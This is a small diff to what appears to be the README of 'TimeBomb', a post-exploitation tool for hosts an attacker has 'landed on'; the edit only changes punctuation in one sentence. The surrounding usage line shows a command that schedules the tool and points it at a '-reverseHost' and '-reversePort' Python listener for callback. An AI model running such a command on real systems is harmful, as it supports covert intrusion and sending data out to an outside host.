@@ -59,7 +59,7 @@ TimeBomb is useful when you landed on a network host and you want to get a notif
 
 Tip: Give as much as possible amount of entries in -newest parameter. For example: 5000
 
-The task is going to run "now"
+The task is going to run now.
 ```
 timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
